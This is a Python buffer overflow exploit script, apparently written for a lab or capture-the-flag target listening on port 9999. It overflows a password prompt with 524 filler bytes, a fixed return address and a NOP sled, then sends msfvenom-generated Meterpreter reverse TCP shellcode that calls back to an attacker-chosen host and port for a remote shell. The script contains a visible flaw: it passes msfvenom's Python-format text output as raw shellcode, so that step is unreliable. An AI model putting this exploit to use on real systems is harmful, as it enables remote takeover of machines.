#t0 - 2024 

import socket
import sys
import string
import struct
import subprocess

PORT = 9999
# make address little endian
def LE(address):
    return struct.pack("<I", address)

def create_shellcode(lhost, lport):
    try:
        command = "msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f python --platform windows -a x86 -b '\\x00'".format(lhost, lport)
        command = command.split(" ")
        result = subprocess.run(command,  stdout=subprocess.PIPE)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return None, e.stderr

if len(sys.argv) < 4:
    print("python {} [rhost] [lhost] [lport]".format(sys.argv[0]))
    exit()

TARGET = sys.argv[1]
print("[+] connecting to {}:{}".format(TARGET,PORT))
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((TARGET, PORT))
    LHOST=sys.argv[2]
    LPORT=sys.argv[3]

    nops = b"\x90"*30
    shellcode = create_shellcode(LHOST, LPORT)
    data = s.recv(1024)
    print(f"Received {data!r}")
    string_data = data.decode("utf-8")
    if "ENTER THE PASSWORD" in string_data:
        payload = b"\x41"*524
        payload +=  LE(0x311712F3)
        payload += nops
        payload += shellcode
        s.sendall(payload)
